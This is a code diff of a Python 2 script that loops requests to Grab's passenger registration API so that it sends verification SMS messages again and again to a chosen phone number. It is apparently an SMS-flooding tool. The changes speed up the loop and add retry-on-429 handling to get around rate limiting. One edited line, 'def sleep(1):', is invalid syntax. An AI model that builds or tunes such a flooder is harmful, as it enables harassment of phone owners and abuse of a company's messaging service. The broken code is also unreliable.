@@ -37,9 +37,9 @@ def wrapsbrace(string, endspace=False):
 		return "[" + string + "] "
 	else:
 		return "[" + string + "]"
-def sleep(x):
+def sleep(1):
 	try:
-		time.sleep(x)
+		time.sleep(1)
 	except KeyboardInterrupt:
 		print "\r" + showstatus(wrapsbrace("except", True) + "KeyboardInterrupt thrown! Exiting . . .", "warn")
 		exit()
@@ -51,13 +51,19 @@ while True:
 	try:
 		r = requests.post("https://p.grabtaxi.com/api/passenger/v2/profiles/register", data={'phoneNumber': _phone, 'countryCode': 'ID', 'name': 'test', 'email': 'mail@mail.com', 'deviceToken': '*'}, headers={'User-Agent': 'curl/7.52.1'})
 	except KeyboardInterrupt:
-		print "\r" + showstatus(wrapsbrace("except", True) + "KeyboardInterrupt thrown! Sleeping for 3s . . .", "warn")
-		sleep(3)
+		print "\r" + showstatus(wrapsbrace("except", True) + "KeyboardInterrupt thrown! Exiting . . .", "warn")
+		exit()
+	except requests.exceptions.ConnectionError:
+		print showstatus(wrapsbrace("except", True) + "ConnectionError thrown! Sleeping for 1s . . .", "warn")
+		sleep(1)
 	else:
+		if r.status_code == 429:
+			print showstatus(wrapsbrace("429 {}".format(r.reason), True) + "Sleeping for 1s . . .", "warn")
+			sleep(1)
 		elif r.status_code == 200:
-			print showstatus(wrapsbrace("200 OK", True) + "GAC SMS sent! Sleeping for 3s . . . (iteration:{})".format(iteration))
+			print showstatus(wrapsbrace("200 OK", True) + "GAC SMS sent! Sleeping for 1s . . . (iteration:{})".format(iteration))
 			iteration += 1
-			sleep(3)
+			sleep(1)
 		else:
 			print showstatus(wrapsbrace("{} {}".format(r.status_code, r.reason), True) + "Something went wrong. Exiting . . .", "warn")
 			exit()
